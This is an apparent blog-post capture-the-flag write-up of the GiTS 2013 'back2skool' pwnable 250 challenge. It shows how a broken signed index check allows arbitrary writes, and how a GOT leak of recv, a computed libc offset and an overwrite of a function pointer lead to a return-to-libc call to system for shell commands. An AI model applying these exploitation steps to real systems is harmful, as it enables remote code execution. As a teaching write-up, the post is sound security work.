<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7 ie" lang="en"> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8 ie" lang="en"> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9 ie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" class="no-js"><!--<![endif]-->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ROSEdu Techblog - GiTS 2013 CTF -- return-to-libc -- pwnable 250</title>
    <link rel="stylesheet" href="./css/style.css" type="text/css">
    <link rel="stylesheet" href="./css/rosedu_links.css" type="text/css">
    <link rel="stylesheet" href="./css/syntax.css" type="text/css">

    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

    <script type="text/javascript">
      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-7579199-6']);
      _gaq.push(['_trackPageview']);

      (function () {
        var ga = document.createElement('script');
        ga.type = 'text/javascript';
        ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(ga, s);
      })();
    </script>
  </head>

  <body>
    <div id="page" class="hentry">
      <header class="the-header">
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./" title="Home">ROSEdu Techblog</a></li>
                <li class="about"><a href="./about.html">About</a></li>
                <li class="people"><a href="./people.html">People</a></li>
                <li class="archive"><a href="./archive.html">Archive</a></li>
                <li class="category"><a href="./tags.html">Tags</a></li>
              </ul>
            </nav>

            <hr />

            <nav class="nav-global">
              <ul>
                <li class="logo"><a href="./archive.html" title="Archive">Latest Posts</a></li>
                
                  <li><a href="./cdl-2015.html" title="Application process for the Community Development Lab">Application pro...</a></li>
                
                  <li><a href="./fp-dragons.html" title="Here be Dragons - The Interesting Realm of Floating Point Operations">Here be Dragons...</a></li>
                
                  <li><a href="./daemonizing-processes.html" title="Daemonizing Processes - Part 1">Daemonizing Pro...</a></li>
                
              </ul>
            </nav>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <div class="body" role="main">
        <div class="unit-body">
          <div class="unit-inner unit-body-inner">
            <div class="entry-content">
              <article class="unit-article layout-post">
                <div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="./ctf-return-to-libc.html" title="GiTS 2013 CTF -- return-to-libc -- pwnable 250">GiTS 2013 CTF -- return-to-libc -- pwnable 250</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on February 19, 2013</span>
      by
      <span class="author"><a href="./people/lucian-cojocar.html">Lucian Cojocar</a></span>
      </span>

      <br />
      <span class="meta">
        Tagged:
        <span class="tags"><a title="All pages tagged 'exploit'." href="./tags/exploit.html">exploit</a>, <a title="All pages tagged 'ctf'." href="./tags/ctf.html">ctf</a>, <a title="All pages tagged 'return-to-libc'." href="./tags/return-to-libc.html">return-to-libc</a>, <a title="All pages tagged 'strace'." href="./tags/strace.html">strace</a>, <a title="All pages tagged 'debugging'." href="./tags/debugging.html">debugging</a>, <a title="All pages tagged 'gdb'." href="./tags/gdb.html">gdb</a>, <a title="All pages tagged 'write-up'." href="./tags/write-up.html">write-up</a></span>
      </span>

      <section id="introduction" class="level1">
<h1>Introduction</h1>
<p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
<!--more-->
</section>
<section id="hello-binary" class="level1">
<h1>Hello binary!</h1>
<p>Let’s start by inspecting the binary.</p>
<p>It is a 32bit dynamically linked binary</p>
<pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre>
<p>Which waits for connections on port 31337</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
listen(3, 20)                           = 0
accept(3,</code></pre>
<p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
<pre><code>$ telnet localhost 31337
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Connection closed by foreign host.
$</code></pre>
<p>It immediately drops connection.</p>
<p>Let’s have a look at what happens when we are connecting to it.</p>
<pre><code>$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
[pid 4359] fork()                                                                   = 4361
[pid 4359] close(4)                                                                 = 0
[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
Failed to find user back2skool: Success
 &lt;unfinished ...&gt;
[pid 4361] +++ exited (status 255) +++</code></pre>
<p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
<p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
<p>After we setup the user we can see the following output when connecting:</p>
<pre><code>$ telnet localhost 31337
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
    __  ___      __  __   _____
   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
 / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
===============================================
Welcome to MathServ! The one-stop shop for all your arithmetic needs.
This program was written by a team of fresh CS graduates using only the most
agile of spiraling waterfall development methods, so rest assured there are
no bugs here!

Your current workspace is comprised of a 10-element table initialized as:
{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }

Commands:
	read	Read value from given index in table
	write	Write value to given index in table
	func1	Change operation to addition
	func2	Change operation to multiplication
	math	Perform math operation on table
	exit	Quit and disconnect
exit
Exiting program!
Connection closed by foreign host.
$</code></pre>
</section>
<section id="the-vulnerability" class="level1">
<h1>The vulnerability</h1>
<section id="high-level" class="level4">
<h4>High-level</h4>
<p>The output of the program is self-explanatory. Let’s try some commands.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
3</code></pre>
<p>Nothing special.</p>
<pre><code>Input position to read from:
10
Value at position 10: 134519224</code></pre>
<p>We can read <strong>past</strong> our table!</p>
<pre><code>Input position to read from:
-200
Value at position -200: 0</code></pre>
<p>We can read <strong>below</strong> our table!</p>
<pre><code>read
Input position to read from:
90000
Connection closed by foreign host.</code></pre>
<p>The program received <code>SIGSEGV</code> and the socket was closed. At least we can crash the program; in fact we are only crashing the child that has been spawned to handle our connection.</p>
<p>But what about write?</p>
<pre><code>$ telnet localhost 31337
write
Input position to write to:
0
Input numeric value to write:
1
Value at position 0: 1</code></pre>
<p>Nothing special.</p>
<pre><code>write
Input position to write to:
10
Table index too large!</code></pre>
<p>Bummer, we cannot <strong>write past</strong> our table!</p>
<pre><code>write
Input position to write to:
-1
Input numeric value to write:
42
Value at position -1: 42
write
Input position to write to:
-10000 
Input numeric value to write:
999
Connection closed by foreign host.</code></pre>
<p>Heh, we can <strong>write below</strong> our table!</p>
</section>
<section id="low-level" class="level4">
<h4>Low-level</h4>
<p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src="./images/ida-atoi-read.png" alt="Read - atoi" /></p>
<p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
<p><img style="float:center" src="./images/ida-atoi-write.png" alt="Write - atoi" /></p>
<p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb13-1"><a href="#cb13-1"></a><span class="dt">int</span> i;</span>
<span id="cb13-2"><a href="#cb13-2"></a>i = atoi(str);</span>
<span id="cb13-3"><a href="#cb13-3"></a><span class="cf">if</span> (i &gt; <span class="dv">9</span>) {</span>
<span id="cb13-4"><a href="#cb13-4"></a>	error();</span>
<span id="cb13-5"><a href="#cb13-5"></a>	exit();</span>
<span id="cb13-6"><a href="#cb13-6"></a>}</span>
<span id="cb13-7"><a href="#cb13-7"></a>do_stuff;</span></code></pre></div>
<p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
<p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
</section>
</section>
<section id="the-exploit" class="level1">
<h1>The exploit</h1>
<p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
<section id="do-we-have-any-rwx-place-to-store-the-payload" class="level3">
<h3>Do we have any RWX place to store the payload?</h3>
<pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
[...]

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x022a8 0x022a8 R E 0x1000
  LOAD           0x002e68 0x0804be68 0x0804be68 0x00204 0x00214 RW  0x1000
  DYNAMIC        0x002e7c 0x0804be7c 0x0804be7c 0x000d8 0x000d8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x001e94 0x08049e94 0x08049e94 0x000c4 0x000c4 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
[...]</code></pre>
<p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
</section>
<section id="is-aslr-enabled" class="level3">
<h3>Is ASLR enabled?</h3>
<p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
</section>
<section id="where-shall-we-write" class="level3">
<h3>Where shall we write?</h3>
<p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
<p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
</section>
<section id="do-we-know-the-address-of-the-buffer" class="level3">
<h3>Do we know the address of the buffer?</h3>
<p>There are three cases where the buffer might be located:</p>
<ul>
<li>on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address;</li>
<li>on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job;</li>
<li>declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</li>
</ul>
<p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
<p><img style="float:center" src="./images/ida-values.png" alt="Values buffer" /></p>
<p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
<p><img style="float:center" src="./images/ida-indirect-jump.png" alt="Indirect jump via math_ptr" /></p>
<p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
<p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
</section>
<section id="first-poc" class="level2">
<h2>First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
<pre><code>$ telnet localhost 31337
[...]
math
You haven't set a mode yet!
func1
Setting mode to ADDITION
write
Input position to write to:
-2147483634
Input numeric value to write:
286331153
Value at position -2147483634: 286331153
math
Connection closed by foreign host.
$</code></pre>
<p>Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4710] recv(4, &quot;\n&quot;, 1, 0)         = 1
[pid  4710] send(4, &quot;Value at position -2147483634: 2&quot;..., 41, 0) = 41
[pid  4710] read(4, &quot;m&quot;, 1)             = 1
[pid  4710] read(4, &quot;a&quot;, 1)             = 1
[pid  4710] read(4, &quot;t&quot;, 1)             = 1
[pid  4710] read(4, &quot;h&quot;, 1)             = 1
[pid  4710] read(4, &quot;\r&quot;, 1)            = 1
[pid  4710] read(4, &quot;\n&quot;, 1)            = 1
[pid  4710] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
Process 4710 detached
$</code></pre>
<p>OK, we’ve got our segmentation fault. Let’s see what was the last instruction pointer.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f /home/back2skool/core 
[...]
Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f'.
Program terminated with signal 11, Segmentation fault.
#0  0x11111111 in ?? ()
(gdb) </code></pre>
<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows</p>
<ul>
<li>the base of our buffer (values) is at a fixed address 0x804c040</li>
<li>the address at which we want to write is 0x804c078</li>
<li>we need to write at position values+0x38</li>
<li>giving a positive index (0x38/4) will give an upper bound error</li>
<li>the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong></li>
<li>you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</li>
</ul>
<p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
<p>##Second PoC</p>
<p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
<p>Let’s inspect again our binary to see what is used from shared libraries.</p>
<pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
         w __gmon_start__
         U __libc_start_main U __stack_chk_fail U accept U atoi U bind
         U chdir U close U err U exit U fork U free U getpwnam U htonl
         U htons U listen U perror U read U recv U send U setgid
         U setgroups U setsockopt U setuid U signal U socket U vasprintf
$ </code></pre>
<p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
<ul>
<li>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</li>
</ul>
<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1"></a>$ <span class="ex">objdump</span> -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  <span class="kw">|</span> <span class="fu">grep</span> -A2 recv@plt</span>
<span id="cb19-2"><a href="#cb19-2"></a><span class="ex">08048980</span> <span class="op">&lt;</span>recv@plt<span class="op">&gt;</span>:</span>
<span id="cb19-3"><a href="#cb19-3"></a> <span class="ex">8048980</span>:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</span></code></pre></div>
<p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
<ul>
<li>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</li>
</ul>
<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1"></a>$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' recv@'</span></span>
<span id="cb20-2"><a href="#cb20-2"></a>  <span class="ex">1124</span>: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0</span>
<span id="cb20-3"><a href="#cb20-3"></a>$ <span class="ex">readelf</span> -s /lib/tls/i686/cmov/libc.so.6 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">' system@'</span></span>
<span id="cb20-4"><a href="#cb20-4"></a>  <span class="ex">1398</span>: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span>
<span id="cb20-5"><a href="#cb20-5"></a>$ <span class="bu">echo</span> <span class="va">$((</span>0x00039100-0x000cebf0<span class="va">))</span></span>
<span id="cb20-6"><a href="#cb20-6"></a><span class="ex">-613104</span></span></code></pre></div>
<p>The offset is -613104, <strong>note</strong> that it depends on the version of libc, hence the exploit isn’t too reliable. Let’s focus though on exploiting locally and postpone the computation of the remote offset. We will write at the same address as in PoC1 but we will write the value of <code>system</code> function i.e. <code>address_of_recv_function+OFFSET</code>.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1"></a>$ <span class="ex">telnet</span> localhost 31337</span>
<span id="cb21-2"><a href="#cb21-2"></a><span class="bu">read</span></span>
<span id="cb21-3"><a href="#cb21-3"></a><span class="ex">Input</span> position to read from:</span>
<span id="cb21-4"><a href="#cb21-4"></a><span class="ex">-32</span></span>
<span id="cb21-5"><a href="#cb21-5"></a><span class="ex">Value</span> at position -32: -1217696784</span>
<span id="cb21-6"><a href="#cb21-6"></a><span class="fu">write</span></span>
<span id="cb21-7"><a href="#cb21-7"></a><span class="ex">Input</span> position to write to:</span>
<span id="cb21-8"><a href="#cb21-8"></a><span class="ex">-2147483634</span></span>
<span id="cb21-9"><a href="#cb21-9"></a><span class="ex">Input</span> numeric value to write:</span>
<span id="cb21-10"><a href="#cb21-10"></a><span class="ex">-1218309888</span></span>
<span id="cb21-11"><a href="#cb21-11"></a><span class="ex">Value</span> at position -2147483634: -1218309888</span>
<span id="cb21-12"><a href="#cb21-12"></a><span class="ex">math</span></span>
<span id="cb21-13"><a href="#cb21-13"></a><span class="ex">Result</span> of math: -1</span></code></pre></div>
<p>Reading from <code>-32</code> it’s equivalent of reading <code>-32*4</code> bytes before our buffer. <code>0x804c040-32*4</code> is <code>0x804bfc0</code>, this is the <code>recv</code> GOT entry. <code>-1218309888</code> is <code>-1217696784-613104</code>.</p>
<p>Hey, it didn’t crashed, that’s a plus! Meanwhile, back at the castle.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1"></a>$ <span class="ex">strace</span> -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f</span>
<span id="cb22-2"><a href="#cb22-2"></a>[<span class="ex">...</span>]</span>
<span id="cb22-3"><a href="#cb22-3"></a>[<span class="ex">pid</span>  4901] send(4, <span class="st">&quot;Value at position -2147483634: -&quot;</span>..., 43, 0) = <span class="ex">43</span></span>
<span id="cb22-4"><a href="#cb22-4"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;m&quot;</span>, 1)             = <span class="ex">1</span></span>
<span id="cb22-5"><a href="#cb22-5"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;a&quot;</span>, 1)             = <span class="ex">1</span></span>
<span id="cb22-6"><a href="#cb22-6"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;t&quot;</span>, 1)             = <span class="ex">1</span></span>
<span id="cb22-7"><a href="#cb22-7"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;h&quot;</span>, 1)             = <span class="ex">1</span></span>
<span id="cb22-8"><a href="#cb22-8"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\r&quot;</span>, 1)            = <span class="ex">1</span></span>
<span id="cb22-9"><a href="#cb22-9"></a>[<span class="ex">pid</span>  4901] read(4, <span class="st">&quot;\n&quot;</span>, 1)            = <span class="ex">1</span></span>
<span id="cb22-10"><a href="#cb22-10"></a>[<span class="ex">...</span>]</span>
<span id="cb22-11"><a href="#cb22-11"></a>[<span class="ex">pid</span>  4902] execve(<span class="st">&quot;/bin/sh&quot;</span>, [<span class="st">&quot;sh&quot;</span>, <span class="st">&quot;-c&quot;</span>, <span class="st">&quot;&quot;</span>], [/* 31 vars */]) = <span class="ex">0</span></span>
<span id="cb22-12"><a href="#cb22-12"></a>[<span class="ex">pid</span>  4902] brk(0)                      = <span class="ex">0x9a04000</span></span>
<span id="cb22-13"><a href="#cb22-13"></a>[<span class="ex">...</span>]</span></code></pre></div>
<p>We successfully <strong>called <code>execve</code></strong>!</p>
</section>
<section id="parameters-to-execve" class="level2">
<h2>Parameters to execve</h2>
<p>We are able to run <code>execve</code> but we don’t control the parameters … yet. Let’s see with what parameters <code>execve</code> is called.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
Reading symbols from /root/back2skool-3fbcd46db37c50ad52675294f5667909d1f...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child 
(gdb) catch syscall execve 
Catchpoint 1 (syscall 'execve' [11])
(gdb) r
[...]
Catchpoint 1 (call to syscall 'execve'), 0xb7fe2424 in __kernel_vsyscall ()
(gdb) info registers 
eax            0xffffffda	-38
ecx            0xbffff3b4	-1073744972
edx            0xbffff5ac	-1073744468
ebx            0xb7fa5a5a	-1208329638
[...]
(gdb) x/s $ebx
0xb7fa5a5a:	 &quot;/bin/sh&quot;
(gdb) x/5x $ecx
0xbffff3b4:	0xb7fa5a5f	0xb7fa5a57	0x0804c040	0x00000000
0xbffff3c4:	0xb7ead180
(gdb) x/s ((char **)$ecx)[0]
0xb7fa5a5f:	 &quot;sh&quot;
(gdb) x/s ((char **)$ecx)[1]
0xb7fa5a57:	 &quot;-c&quot;
(gdb) x/s ((char **)$ecx)[2]
0x804c040 &lt;values&gt;:	 &quot;&quot;
(gdb) </code></pre>
<p>Because we’re using <code>system</code> function the first parameters are set accordingly (<code>sh -c</code>) but the actual command (<code>(char **)$ecx)[2]</code>) is empty. You can have a look at <code>execve</code> syscall <a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">parameters</a> and the <a href="http://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-on-x86-64">calling convention</a> for it. Here we’re very <strong>lucky</strong>, the command that is passed to system is our buffer with values, the initial table. Let’s recap our approach:</p>
<ul>
<li>get the address of <code>recv</code> function via GOT</li>
<li>set the pointer of <code>math</code> function to <code>system</code> by adding an offset to <code>recv</code> function address</li>
<li>set the parameters in the workspace table</li>
<li>trigger the exploit by using the <code>math</code> function</li>
<li>profit</li>
</ul>
</section>
<section id="getting-some-output" class="level2">
<h2>Getting some output</h2>
<p>The only problem was that the communication socket was number 4 and the output went to file descriptor 1, but running the command with <code>&gt;&amp;4 2&gt;&amp;4</code> appended, did the trick for us.</p>
</section>
<section id="the-offset-the-achilles-heel-of-the-exploit" class="level2">
<h2>The offset, the Achilles’ Heel of the exploit</h2>
<p>Well, the exploit worked locally, but remote it didn’t.</p>
<p>Recall that when computing the offset of <code>system</code> function in respect to <code>recv</code> function, we were able to access the libc that was used on the target <code>system</code>. A few ideas appeared:</p>
<ul>
<li>try different offsets by gathering as many libcs as possible from well known distros. After one hour of trying all the libc binaries from Ubuntu I start to wonder if I’m on the right track.</li>
<li>try random values - this didn’t work at all and it was time consuming (I was already tired and my thinking was bad)</li>
<li>get a copy of in use libc - this is a problem, because we cannot do <code>open</code>, in the best case, we might do some <code>send</code> over the socket using as buffer input the libc mapping.</li>
<li>hope for the best, and use another challenge (which we already exploited) and download that libc file and hope that this system has the same one.</li>
<li>try to do a more intelligent search by matching function entries (<code>push   %ebp</code>, <code>mov %esp, %ebp</code> etc.), this would require too much work.</li>
<li>use some magical tool/table that I’m not sure it exists.</li>
</ul>
<p>We used a <strong>previous</strong> level and was able to <strong>download</strong> the libc, this libc was identical with the one that was in use by the current challenge, so we were able to compute the offset for the remote system.</p>
<p>I don’t know of any method of doing a reliable return-to-libc attack without knowing the addresses of some functions. Maybe there’s a method of getting all the symbols after knowing the libc base, that would be neat.</p>
<p>The final exploit can be found <a href="res/pwn250.py">here</a>.</p>
</section>
</section>
<section id="conclusion" class="level1">
<h1>Conclusion</h1>
<p>We’ve presented a way of doing a return-to-libc attack, even though this is a primitive return-to-libc approach, we used a function from libc. We also had to compute the offset of that function using the address of another function - this makes the exploit unreliable.</p>
<p>In the end, it boils down to have the right skill for using the right tools, it’s nothing fancy.</p>
</section>

    </div>
  </div>
</div>

<!-- Social Buttons here -->
<div id="sociallinks">
  <a href="https://twitter.com/home?status=/ctf-return-to-libc.html" target="_blank">Tweet this</a> -
  <a href="http://www.facebook.com/sharer/sharer.php?u=/ctf-return-to-libc.html" target="_blank">Like this</a> -
  <a href="https://plus.google.com/share?url=/ctf-return-to-libc.html" target="_blank">Share on G+</a>
</div>

<script>
  (function(){window.addEventListener("DOMContentLoaded",function(){
    //get URL
    var url=document.location;
    var links=document.getElementById("sociallinks")
                      .getElementsByTagName('a');
    for (var i=0;i!=links.length;i++){
      // Replacing /ctf-return-to-libc.html with current URL
      links[i].setAttribute("href",links[i].href.replace('/ctf-return-to-libc.html',url));
    }})})();
</script>
</br>

<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'rosedutechblog';
  var disqus_url = window.location.href.split('/').splice(0,3).join("/")+'/ctf-return-to-libc.html';
  var title = 'GiTS 2013 CTF -- return-to-libc -- pwnable 250';
  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

              </article>
              
            </div>
          </div>
        </div>
      </div>

